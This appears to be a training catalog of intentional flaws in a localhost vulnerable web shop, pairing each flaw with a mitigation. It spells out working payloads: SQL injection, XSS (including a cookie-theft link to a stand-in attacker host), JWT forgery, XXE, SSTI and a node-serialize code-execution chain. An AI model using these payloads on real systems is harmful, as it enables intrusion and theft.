NORTHWIND OUTFITTERS  --  VulnShop Vulnerability Catalog
==========================================================

This file documents every intentional vulnerability shipped in vuln-shop.
For each entry: ID, category, location, manual exploit steps, mitigation.
All vulnerabilities are reachable from a fresh seed; smoke-test.ps1 exercises
the majority automatically.

Base URL: http://127.0.0.1:3002
Email service: http://127.0.0.1:5002 (Flask, SSTI sink)
Default users (see seed.js for the full list):
  olivia.park       / OliviaP!23     (customer)
  samuel.kim        / samkimsam      (customer)
  james.olsson      / IceClimber1    (customer, $1850 credits)
  admin_kate        / AdminKate!1    (admin)


-----------------------------------------------------------------
SQL INJECTION
-----------------------------------------------------------------

V-SHOP-001  SQL injection on /auth/login
  Location:  routes/auth.js  (LOGIN_SQL string interpolation)
  Exploit:   POST /auth/login
             username=anything' OR '1'='1' --
             password=anything
             Authenticates as the first row in users (olivia.park).
  Mitigation: use parameterised queries (db.prepare('... WHERE username = ?')).

V-SHOP-002  SQL injection on /products/search
  Location:  routes/products.js  (search uses string concatenation)
  Exploit:   GET /products/search?q=cap' UNION SELECT id,username,password_md5,
             email,full_name,address,role,0,0,'a','a' FROM users--
             Dumps password hashes into the catalog grid.
  Mitigation: parameterised LIKE query + allow-list of order-by columns.

V-SHOP-003  SQL injection on /admin/users?q=
  Location:  routes/admin.js  (admin/users search)
  Exploit:   GET /admin/users?q=' OR 1=1--   (after auth_token cookie)
             Returns every user including password_md5.
  Mitigation: parameterise, and never SELECT password columns into views.


-----------------------------------------------------------------
CROSS-SITE SCRIPTING
-----------------------------------------------------------------

V-SHOP-010  Reflected XSS on /products/search
  Location:  views/product_search.ejs  (<%- q %>)
  Exploit:   GET /products/search?q=<script>alert(1)</script>
  Mitigation: render with <%= q %> (HTML-escape) or use a stricter template
              helper for untrusted strings.

V-SHOP-011  Stored XSS in reviews
  Location:  views/product_detail.ejs  (<%- r.body %>)
  Exploit:   POST /products/1/reviews  body=<img src=x onerror=alert(1)>
             GET  /products/1   -- payload fires for every visitor.
  Mitigation: sanitise on save (DOMPurify) and render escaped on display.

V-SHOP-012  Stored XSS via order shipping address
  Location:  views/order_detail.ejs and views/admin.ejs (<%- o.shipping_address %>)
  Exploit:   Place an order with shipping_address=<svg onload=alert(1)>; the
             admin dashboard fires the script when staff opens the order.
  Mitigation: HTML-escape user-supplied text everywhere, not just on customer
              pages.

V-SHOP-013  DOM XSS via location.hash
  Location:  public/js/app.js  (slot.innerHTML = decodeURIComponent(hash))
  Exploit:   Browse http://127.0.0.1:3002/#<img src=x onerror=alert(1)>
  Mitigation: never assign untrusted input to .innerHTML; use textContent.

V-SHOP-014  HTML rendering of support subject in admin
  Location:  views/admin.ejs (<%- s.subject %>, <%- s.body %>)
  Exploit:   POST /contact subject=<script>fetch('/admin/promote/8')</script>
             When admin_kate views /admin the script promotes user 8.
  Mitigation: escape contact form output on render.

V-SHOP-015  Reflected XSS in attribute context on /products/search
  Location:  views/product_search.ejs  (<input value="<%- qAttr %>">)
             routes/products.js (qAttr escapes `<` and `>` but NOT `"`)
  Exploit:   /products/search?q=%22%20autofocus%20onfocus%3Dalert(1)%20x%3D%22
             ?safe=1 still passes this -- the half-encoder ignores quotes.
  Mitigation: HTML-attribute escape (`<%= %>` encodes `"` to `&quot;`) or
              use a context-aware sanitiser.

V-SHOP-016  Reflected XSS with `<>`-only encoder on /products/search?safe=1
  Location:  routes/products.js (qBody = q.replace(/</,'&lt;').replace(/>/,'&gt;'))
  Exploit:   The element-body sink is closed under ?safe=1, but the same `q`
             still lands in the attribute sink unescaped (see V-SHOP-015).
             The half-fix is worse than no fix: developers think the page is
             safe and stop reviewing it.
  Mitigation: never write your own encoder; use the framework's
              context-aware escapers.

V-SHOP-017  DOM XSS via postMessage with no origin check
  Location:  public/js/app.js
             window.addEventListener('message', e => slot.innerHTML = e.data)
  Exploit:   Frame the shop on attacker.example and post a string:
               <iframe src="http://127.0.0.1:3002/" id=f></iframe>
               <script>
                 f.onload = () => f.contentWindow.postMessage(
                   '<img src=x onerror=alert(1)>', '*')
               </script>
             Or from the shop's own devtools:
               window.postMessage('<img src=x onerror=alert(1)>', '*')
  Mitigation: validate `e.origin` against an allow-list; treat `e.data` as
              opaque untrusted input; use textContent.

V-SHOP-018  Stored XSS via review markdown -- `[text](javascript:...)` + raw HTML
  Location:  views/product_detail.ejs (renderReviewMd helper)
  Exploit:   # raw HTML pass-through (the markdown layer does not strip tags):
             POST /products/1/reviews body=<img src=x onerror=alert(1)>
             POST /products/1/reviews body=<svg onload=alert(1)>
             # `javascript:` URI via the [text](url) markdown -- avoid nested
             # parens because the toy parser stops at the first `)`:
             POST /products/1/reviews body=[click](javascript:alert`1`)
             POST /products/1/reviews body=[x](javascript:document.location='//attacker/c?'+document.cookie)
             # mXSS-style sanitiser confusion (re-parse after markdown layer):
             body=<noscript><p title="</noscript><img src=x onerror=alert(1)>">
  Mitigation: use a real markdown library with HTML sanitisation enabled;
              reject URLs whose scheme is not in {http, https, mailto}.

V-SHOP-019  Vulnerable component -- marked@0.3.6 raw-HTML pass-through (CH 34)
  Location:  routes/components.js  GET/POST /components/preview-description
             package.json:  "marked": "^0.3.6"
  Exploit:   curl 'http://127.0.0.1:3002/components/preview-description?md=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'
             curl -X POST http://127.0.0.1:3002/components/preview-description \
               -H 'Content-Type: application/json' \
               -d '{"markdown":"[click](javascript:alert`1`)"}'
             # marked@0.3.6 passes raw HTML through by default. Even with
             # { sanitize: true } it has multiple known bypasses fixed only
             # in 0.7.0 (CVE-2018-1000156-style autolink, javascript: URIs).
  Mitigation: upgrade to marked@>=4.0.0; pair with DOMPurify on the output.
              Reject URLs whose scheme is not http/https/mailto.
              Run `npm audit` and let CI fail on Moderate+.

V-SHOP-019a Library version disclosure
  Location:  routes/components.js  GET /components/version
  Exploit:   curl http://127.0.0.1:3002/components/version
             # Returns the dependency list (including marked@0.3.6).
  Mitigation: do not ship a public version endpoint; if needed for
              monitoring, restrict to internal IPs.


-----------------------------------------------------------------
AUTHENTICATION & SESSION
-----------------------------------------------------------------

V-SHOP-020  JWT alg=none accepted
  Location:  lib/auth.js  (verifyToken trusts unsigned tokens)
  Exploit:   header  {"alg":"none","typ":"JWT"}
             payload {"uid":10,"role":"admin"}
             token=<b64h>.<b64p>.
             Send as Authorization: Bearer <token>   or as auth_token cookie.
             GET /api/me -> returns admin row.
  Mitigation: require alg=HS256 and reject anything else.

V-SHOP-021  Weak hard-coded JWT secret
  Location:  lib/auth.js  (JWT_SECRET = 'shop-dev-secret-2024')
  Exploit:   Crack with hashcat -m 16500 (HMAC-SHA256 JWT) using rockyou.
  Mitigation: generate a 256-bit random secret per environment, store in env.

V-SHOP-022  Unsalted MD5 password hashing
  Location:  lib/auth.js (md5) + users.password_md5
  Exploit:   After dumping users (V-SHOP-002) crack MD5s offline; a 1080Ti
             does billions of MD5/s.
  Mitigation: argon2id with per-user salt + reasonable memory cost.

V-SHOP-023  Session cookie lacks security flags
  Location:  server.js (cookie: { httpOnly: false, secure: false, sameSite: false })
  Exploit:   document.cookie steals the session id from any XSS vector.
  Mitigation: httpOnly + secure + sameSite=Lax|Strict.

V-SHOP-024  Mass-assignment on /auth/register
  Location:  routes/auth.js (Object.assign / spread of req.body)
  Exploit:   POST /auth/register  username=evil&password=x&role=admin
             &credits_cents=9999999
             Creates an admin account with $99,999 credits.
  Mitigation: allow-list of writable fields (username, password, email,
              full_name, address) and ignore everything else.


-----------------------------------------------------------------
ACCESS CONTROL
-----------------------------------------------------------------

V-SHOP-030  Broken access control on /admin
  Location:  routes/admin.js (no requireAdmin middleware)
  Exploit:   GET /admin while logged in as any customer.
  Mitigation: requireAdmin (and require session, not just cookie) on every
              /admin route.

V-SHOP-031  IDOR on /cart/:id
  Location:  routes/cart.js (lookup by URL id, no owner check)
  Exploit:   GET /cart/2 when your own cart is 1 -> view another user's cart.
  Mitigation: SELECT ... WHERE id=? AND user_id=?

V-SHOP-032  IDOR on /orders/:id
  Location:  routes/orders.js
  Exploit:   GET /orders/3 with olivia.park's session reveals samuel.kim's order.
  Mitigation: enforce user_id ownership before rendering.

V-SHOP-033  BOLA on /api/users/:id and /api/orders/:id
  Location:  routes/api.js
  Exploit:   curl http://127.0.0.1:3002/api/users/10 -H "auth: <olivia jwt>"
             returns admin_kate's row.
  Mitigation: same as V-SHOP-031.

V-SHOP-034  No-auth bulk dump on /api/v1/users
  Location:  routes/api.js (/v1/users mounted under /api)
  Exploit:   curl http://127.0.0.1:3002/api/v1/users
             returns every user JSON (no token required).
  Mitigation: require auth + role=admin + remove this endpoint.

V-SHOP-035  Real GraphQL endpoint with the full classic bug surface
  Location:  routes/graphql.js  POST/GET /graphql
  Surface:   - introspection enabled (default; no NoSchemaIntrospection rule)
             - no depth / complexity / cost limit -> nested-query DoS
             - batching enabled (POST array body) -> rate-limit bypass
             - GET ?query= supported -> CSRF on side-effect-free queries
             - field-level disclosure: User.passwordMd5 + User.ccLast4
             - BOLA: user(id) and order(id) -- no ownership check
             - mass-assignment: register(role: "admin") -> self-promote
             - unauthenticated mutation: promoteUser(id) -> root -> admin
             - applyCoupon(code) throws "No such coupon: <code>" -> existence oracle
             - did-you-mean field suggestions in errors (graphql default)
  Exploit:   # 1. Introspection dump
             curl -s -X POST http://127.0.0.1:3002/graphql \
               -H 'Content-Type: application/json' \
               -d '{"query":"{__schema{types{name fields{name type{name}}}}}"}'
             # 2. Field-level password hash leak
             curl -s -X POST http://127.0.0.1:3002/graphql -H 'Content-Type: application/json' \
               -d '{"query":"{ users { id username role passwordMd5 ccLast4 } }"}'
             # 3. Mass-assignment self-promote via register mutation
             curl -s -X POST http://127.0.0.1:3002/graphql -H 'Content-Type: application/json' \
               -d '{"query":"mutation{register(username:\"evil\",password:\"x\",email:\"e@e\",role:\"admin\"){id role}}"}'
             # 4. Unauthenticated promoteUser mutation
             curl -s -X POST http://127.0.0.1:3002/graphql -H 'Content-Type: application/json' \
               -d '{"query":"mutation{ promoteUser(id:1){ id username role } }"}'
             # 5. Alias-based coupon enumeration (one HTTP request, many guesses)
             curl -s -X POST http://127.0.0.1:3002/graphql -H 'Content-Type: application/json' \
               -d '{"query":"{a:coupon(code:\"SAVE10\"){percentOff} b:coupon(code:\"VIP50\"){percentOff}}"}'
             # 6. Nested-query DoS (depth 8+ via review -> author -> reviews -> product -> reviews ...)
             # 7. Batching: POST a JSON array of N operations in one request
  Mitigation: disable introspection in prod, add depth+complexity validation
              rules, disable GET for mutations, require auth on every resolver,
              hide passwordMd5 / ccLast4 behind admin-only access, generic
              error messages.

V-SHOP-036  Privilege escalation via GET /admin/promote/:id
  Location:  routes/admin.js
  Exploit:   Trick an admin into clicking
             http://127.0.0.1:3002/admin/promote/9 (CSRF, V-SHOP-052).
             Or any user can hit it directly (no role check).
  Mitigation: requireAdmin + CSRF token + POST only.

V-SHOP-037  Mass-assignment via PUT /api/users/:id
  Location:  routes/api.js
  Exploit:   curl -X PUT /api/users/3 -H "Content-Type: application/json"
             -d '{"role":"admin","credits_cents":100000000}'
             Any user can promote themselves and mint credits.
  Mitigation: allow-list updatable fields per role.


-----------------------------------------------------------------
INJECTION & DESERIALISATION
-----------------------------------------------------------------

V-SHOP-040  Prototype pollution via /profile
  Location:  routes/profile.js (unsafeDeepMerge into req.user)
  Exploit:   POST /profile  (JSON body)
             { "settings": { "__proto__": { "isAdmin": true } } }
             Then GET /profile/perks-check -> returns admin perks because
             Object.prototype.isAdmin is now true for every object.
  Mitigation: never deep-merge raw req.body; if you must, use a safe merge that
              skips __proto__/constructor/prototype.

V-SHOP-041  SSTI via /contact (Jinja2 in email-service)
  Location:  routes/contact.js -> email-service/email_service.py
             render_template_string(subject + ' :: ' + body)
  Exploit:   POST /contact  subject={{7*7}}  body=hi
             Response body contains '49 :: hi'.  Escalation:
             subject={{ ''.__class__.__mro__[1].__subclasses__() }}
  Mitigation: never render user input as a template; use render_template with
              named context vars only.

V-SHOP-042  XXE on /import/xml
  Location:  routes/import.js (custom DTD entity resolver fetches file:// + http://)
  Exploit:   POST /import/xml  Content-Type: application/xml
             <!DOCTYPE r [<!ENTITY x SYSTEM "file:///C:/Windows/win.ini">]>
             <r>&x;</r>
             Response echoes the file contents.  Also works with http:// to the
             email-service for SSRF chaining.
  Mitigation: use a parser without external entity support; reject DOCTYPE
              entirely.

V-SHOP-043  Open redirect on /go?u=
  Location:  routes/api.js (or server.js, GET /go)
  Exploit:   /go?u=https://attacker.example/phish
  Mitigation: allow-list of relative paths or explicit hostnames.


-----------------------------------------------------------------
BUSINESS LOGIC
-----------------------------------------------------------------

V-SHOP-050  Price tampering on POST /cart/add
  Location:  routes/cart.js (price_cents read from req.body)
  Exploit:   POST /cart/add  product_id=11 (tent $249.99)  qty=1  price_cents=1
             Tent gets added at $0.01.
  Mitigation: server looks up price from products table, ignores client field.

V-SHOP-051  Negative quantity accepted on /checkout
  Location:  routes/checkout.js
  Exploit:   Add product A and product B with qty=-1 to lower the order total.
  Mitigation: validate qty >= 1.

V-SHOP-052  CSRF on state-changing GET endpoints
  Location:  routes/cart.js GET /cart/remove/:id, routes/admin.js GET /admin/promote/:id
  Exploit:   <img src="http://127.0.0.1:3002/admin/promote/9"> on an external
             site; if admin_kate is logged in, user 9 becomes admin.
  Mitigation: state-changing actions over POST + CSRF token + SameSite cookie.

V-SHOP-053  Coupon code enumeration
  Location:  routes/checkout.js (good code -> 200 with %, bad code -> 404)
  Exploit:   for c in candidates: POST /checkout/coupon code=$c; distinguish
             200 vs 404 -> discovers STAFF50.
  Mitigation: constant-time response (always 200 with generic message);
              rate-limit.

V-SHOP-054  Coupon reuse (no per-user use limit)
  Location:  routes/checkout.js
  Exploit:   Apply STAFF50 (50% off) on dozens of orders with the same account.
  Mitigation: track redemptions per user + global cap.

V-SHOP-055  Race condition on inventory decrement
  Location:  routes/checkout.js (40 ms window between stock check and update)
  Exploit:   Send 20 simultaneous POST /checkout for the last item in stock;
             multiple orders succeed against stock=1.
  Mitigation: UPDATE products SET stock = stock - ? WHERE id=? AND stock >= ?
              and check rowcount.


-----------------------------------------------------------------
SSRF / FILE UPLOAD / PATH TRAVERSAL
-----------------------------------------------------------------

V-SHOP-060  SSRF on /proxy/image?u=
  Location:  routes/proxy.js (fetches arbitrary URL, returns body)
  Exploit:   /proxy/image?u=http://127.0.0.1:5002/debug
             /proxy/image?u=http://169.254.169.254/latest/meta-data/
  Mitigation: allow-list outbound hosts; block RFC1918 + link-local.

V-SHOP-061  Unrestricted file upload on /admin/upload
  Location:  routes/admin.js (multer keeps originalname, no MIME check)
  Exploit:   POST /admin/upload file=@payload.html
             Then visit /uploads/payload.html -> renders as HTML in same
             origin; if you have admin session, /uploads serves anything.
  Mitigation: validate MIME + magic bytes, force safe extension, serve
              uploads from a separate origin or with Content-Disposition.

V-SHOP-062  Path traversal via uploaded filename
  Location:  routes/admin.js / lib/uploads write path
  Exploit:   Upload with filename ../../seed.js -> overwrites the seed file.
  Mitigation: never trust originalname; use a generated UUID + sanitised ext.


-----------------------------------------------------------------
TRANSPORT / HEADER / CORS
-----------------------------------------------------------------

V-SHOP-070  CORS reflection with credentials
  Location:  routes/api.js  (Access-Control-Allow-Origin echoes Origin)
  Exploit:   from attacker.example: fetch('http://127.0.0.1:3002/api/me',
             {credentials:'include'}).then(r=>r.json()) leaks the victim row.
  Mitigation: allow-list of origins; never reflect with credentials=true.

V-SHOP-071  Cache poisoning via X-Forwarded-Host
  Location:  routes/admin.js (rewrites links from X-Forwarded-Host header)
  Exploit:   curl /admin -H "X-Forwarded-Host: evil.example" -> response now
             references evil.example for login links.  Behind a cache, the
             poisoned page is served to other admins.
  Mitigation: ignore X-Forwarded-Host or only honour from trusted proxies.

V-SHOP-072  Missing security headers + vulnerable jQuery
  Location:  views/partials/header.ejs loads jQuery 1.12.4 from CDN; no
             Content-Security-Policy, X-Frame-Options, X-Content-Type-Options.
  Exploit:   jQuery 1.12.4 CVE-2019-11358 (prototype pollution via
             $.extend(true, {}, JSON.parse(payload))).
  Mitigation: jQuery >= 3.5 (or no jQuery), add CSP, X-Frame-Options=DENY,
              X-Content-Type-Options=nosniff.

V-SHOP-073  Vulnerability disclosure on /debug
  Location:  server.js (always-on /debug endpoint dumping env+session+headers)
  Exploit:   curl /debug
  Mitigation: remove debug surface in production builds.

V-SHOP-074  Stack trace leakage in error handler
  Location:  server.js (error middleware returns err.stack as response body)
  Exploit:   /products/abc (string id -> SQL parse error stack)
  Mitigation: generic 500 to clients; full stack only to logs.

V-SHOP-075  Source map disclosure
  Location:  public/js/app.js references //# sourceMappingURL=app.js.map
             which contains sourcesContent with fake secrets.
  Exploit:   curl /static/js/app.js.map | jq .sourcesContent
  Mitigation: do not ship .map files to production; or restrict by IP.

V-SHOP-076  Secret in client bundle
  Location:  public/js/app.js (window.__NORTHWIND__.shopifyKey)
  Exploit:   view-source on any page; grep for sk_test_.
  Mitigation: keep all secrets server-side.


-----------------------------------------------------------------
RATE / DOS
-----------------------------------------------------------------

V-SHOP-080  No rate limiting anywhere
  Location:  server.js  (no express-rate-limit middleware)
  Exploit:   1000 POST /auth/login attempts in parallel succeed.
  Mitigation: per-IP and per-account throttling.


-----------------------------------------------------------------
INSECURE DESERIALIZATION
-----------------------------------------------------------------

V-SHOP-100  Node deserialization RCE via /cart/import (CVE-2017-5941 class)
  Location:  routes/cart.js  (serialize.unserialize(raw))
  Sink:      node-serialize@0.0.4 .unserialize() evaluates any value
             prefixed with "_$$ND_FUNC$$_" via eval. When the function
             body ends with `()` (an IIFE), the function is invoked
             during deserialization, producing arbitrary code execution
             in the Node process context.
  Exploit:
    Step 1 - build the IIFE payload that reads the flag file and
             writes it to a publicly served upload:

      const serialize = require('node-serialize');
      const evil = serialize.serialize({
        items: [],
        owner_id: 1,
        rce: "_$$ND_FUNC$$_function(){require('fs').writeFileSync(" +
             "'data/uploads/leak.txt'," +
             "require('fs').readFileSync('data/.deserialize-flag','utf8'));}()"
      });
      const token = Buffer.from(evil).toString('base64');

    Step 2 - POST the base64 token to /cart/import as the `token`
             form field (any logged-in session works; new free
             account is fine):

      curl -b cookies.txt -d "token=<BASE64>" \
           http://127.0.0.1:3002/cart/import

    Step 3 - retrieve the flag from the public uploads dir:

      curl http://127.0.0.1:3002/uploads/leak.txt
      -> AccessibleBBB{deserialize-node-serialize-rce}

  Mitigation:
    1) Do not deserialize user-controlled data with a format that
       supports code references (node-serialize, php unserialize,
       python pickle, java ObjectInputStream, ruby Marshal, .NET
       BinaryFormatter, YAML !!js/function, etc.).
    2) Use a flat data format with no executable representation:
       JSON.parse (NOT JSON.parse with a reviver that constructs
       objects), MessagePack, Protocol Buffers, schema-validated
       Zod / Joi / Yup objects.
    3) If a "remember-me" or "share token" pattern is required,
       sign and verify the token (JWT HS256 with a 32-byte key, or
       HMAC over base64 ciphertext) and check the signature BEFORE
       parsing the contents.
    4) Reject node-serialize entirely: the package is unmaintained
       since 2017 and every release ships the same RCE primitive.


V-SHOP-101  Logic deserialization: cart token's owner_id is trusted
  Location:  routes/cart.js  (parseInt(payload.owner_id, 10))
  Exploit:   Forge a non-malicious cart token whose owner_id field
             matches another user's account id; POST it to
             /cart/import to push items into their cart. Chains
             with V-SHOP-050 price tampering: insert qty=99 at
             price_cents=1 into admin_kate's cart, then social-
             engineer her to "complete checkout" of her own cart.
  Mitigation:
    Ignore any user identifier embedded in the token. Always derive
    cart ownership from the authenticated session (req.session.userId).


V-SHOP-102  Blind deserialization on /cart/import (no output reflected)
  Location:  routes/cart.js  (the unserialize call returns nothing to
             the client when the IIFE does not throw; you only see a
             redirect)
  Exploit:   Confirm code execution without console output via a
             sleep gadget, then escalate to filesystem write:

      "_$$ND_FUNC$$_function(){require('child_process')." +
      "execSync('powershell -c Start-Sleep -s 4');}()"

             If the /cart/import POST takes >4 s, RCE is confirmed.
             Then send the file-write payload from V-SHOP-100.
  Mitigation: same as V-SHOP-100.


-----------------------------------------------------------------
WEB CACHE POISONING & DECEPTION
-----------------------------------------------------------------

V-SHOP-110  Cache poisoning via unkeyed X-Forwarded-Host on /products
  Location:  lib/cache.js (cache key is METHOD + URL only — does not
             include Vary, Cookie, or any Host header) plus
             routes/products.js + views/partials/header.ejs (the
             X-Forwarded-Host value reaches the rendered HTML through
             res.locals.canonicalHost and is emitted as
             <script src="//<host>/static/js/track.js">).
  Exploit:
    Step 1 - poison the cache slot for /products with attacker-controlled host:

      $u = '/products?_v=' + (Get-Random)
      curl -i ("http://127.0.0.1:3002" + $u) `
           -H "X-Forwarded-Host: evil.example"

             The first response is X-Cache: MISS and the rendered HTML
             contains <script src="//evil.example/static/js/track.js">.

    Step 2 - every subsequent visitor (within the 30 s TTL) requesting
             the same URL receives the poisoned response from cache.
             The X-Cache: HIT header confirms the cache served the
             attacker payload:

      curl -i ("http://127.0.0.1:3002" + $u)

             Response body contains attacker's script tag; victims'
             browsers fetch and execute evil.example/static/js/track.js.

  Impact:    Stored XSS for every visitor of /products for the TTL.
             Combine with an attacker-controlled host that serves
             arbitrary JS for site-wide credential theft, session
             hijack, or arbitrary admin actions via the victim's cookies.
  Mitigation: include Vary: X-Forwarded-Host in the cache key, or
              never reflect proxy headers into HTML, or normalize host
              to a known value before rendering.

V-SHOP-111  Web cache deception of /profile/:anything (Omer Gil 2017 class)
  Location:  routes/profile.js (router.get('/profile/:anything', ...))
             accepts any suffix and renders the logged-in user's profile;
             lib/cache.js force-caches URLs ending in .css/.js/.png/.svg/.ico
             for 60 s regardless of Cache-Control.
  Exploit:
    Step 1 - attacker tricks a logged-in victim into visiting

      https://127.0.0.1:3002/profile/anything_<rand>.css

             (links from a phishing email, attacker page, or XSS).

    Step 2 - the victim's authenticated request reaches the origin,
             which renders the victim's profile HTML. The cache
             middleware sees the .css suffix and stores the response
             under the URL key. Cookie is NOT in the cache key.

    Step 3 - attacker (no session) requests the same URL:

      curl http://127.0.0.1:3002/profile/anything_<rand>.css

             Response is the victim's profile HTML, served from cache.
             X-Cache: HIT confirms the cache serviced the request.

  Impact:    Public disclosure of every user's profile (email, address,
             full name, profile JSON) any time the attacker can lure
             them to a deceptive URL. With sensitive endpoints
             (statements, orders, API keys), full PII/financial leak.
  Mitigation:
    1. The origin must refuse path suffixes it did not advertise (a
       canonical 404 for /profile/anything.css).
    2. The cache must consider Set-Cookie / Cache-Control headers and
       refuse to store responses that carry per-user state.
    3. The cache must key on the Cookie header (or at least the
       presence of an Authorization / session cookie) when the
       upstream response contains user-private data.


-----------------------------------------------------------------
LOGGING & MONITORING (A09, Ch 36)
-----------------------------------------------------------------

V-SHOP-120  Sensitive data written to data/access.log
  Location:  lib/access-log.js (writes one JSON line per request
             including the parsed body and the Cookie header).
             Mounted globally in server.js after bodyParser.json.
  Exploit:   Anyone who reaches the file -- via container volume
             mount, container escape, log-shipper, backup -- sees:
               * cleartext POST /login passwords
               * cleartext POST /register passwords
               * cleartext POST /checkout {card, cvv, exp}
               * session cookie values (replayable while valid)
             Reproduce:
               curl -s -X POST http://localhost:3002/checkout \
                 -H 'Content-Type: application/json' \
                 --data-raw '{"card":"4111111111111234","cvv":"987",
                              "exp":"12/29","name":"Olivia Park"}'
               tail -n1 VulnLabs/vuln-shop/data/access.log
  Mitigation: never log secrets.  Whitelist the fields you log; mask
              `password`, `card`, `cvv`, `pin`, `token`, and the
              Cookie header before serialisation.  PCI-DSS forbids
              storing the CVV at all.

V-SHOP-121  GET /admin/logs reachable by any logged-in customer
  Location:  routes/admin.js
  Exploit:   curl -b cookies.jar http://localhost:3002/admin/logs?tail=500
             A logged-in customer pulls every other customer's password
             and credit card out of the access log.
  Mitigation: add a real requireRole('admin') gate.  Better: do not
              expose log viewers in the application at all -- ship logs
              to a separate analytics/SIEM tool.

V-SHOP-122  No rate limit / no anomaly detection
  Location:  routes/auth.js (login + register), routes/checkout.js
             (coupon, card validation).
  Exploit:   coupon enumeration, login brute-force, CVV brute-force
             all leave no signal in the audit trail because there is
             no audit trail.
  Mitigation: express-rate-limit per IP + per account on auth and
              payment routes; alert when M failures / window.


-----------------------------------------------------------------
EXPLOIT QUICK-REFERENCE (PowerShell 5.1)
-----------------------------------------------------------------

  # SQLi login
  Invoke-WebRequest -UseBasicParsing http://127.0.0.1:3002/auth/login `
    -Method POST -ContentType "application/x-www-form-urlencoded" `
    -Body "username=admin' OR '1'='1' --&password=x"

  # Stored XSS review
  Invoke-WebRequest http://127.0.0.1:3002/products/1/reviews -Method POST `
    -ContentType "application/x-www-form-urlencoded" `
    -Body "rating=5&body=<img src=x onerror=alert(1)>" -WebSession $s

  # Price tampering
  Invoke-WebRequest http://127.0.0.1:3002/cart/add -Method POST `
    -ContentType "application/x-www-form-urlencoded" `
    -Body "product_id=11&qty=1&price_cents=1" -WebSession $s

  # SSTI via contact -> email-service
  Invoke-WebRequest http://127.0.0.1:3002/contact -Method POST `
    -ContentType "application/x-www-form-urlencoded" `
    -Body "subject={{7*7}}&body=hi" -WebSession $s

  # XXE
  $xml = "<!DOCTYPE r [<!ENTITY x SYSTEM ""file:///C:/Windows/win.ini"">]><r>&x;</r>"
  Invoke-WebRequest http://127.0.0.1:3002/import/xml -Method POST `
    -ContentType "application/xml" -Body $xml

  # JWT alg=none
  $h = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"alg":"none","typ":"JWT"}')).TrimEnd('=').Replace('+','-').Replace('/','_')
  $p = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"uid":10,"role":"admin"}')).TrimEnd('=').Replace('+','-').Replace('/','_')
  $jwt = "$h.$p."
  Invoke-WebRequest http://127.0.0.1:3002/api/me -Headers @{Authorization="Bearer $jwt"}
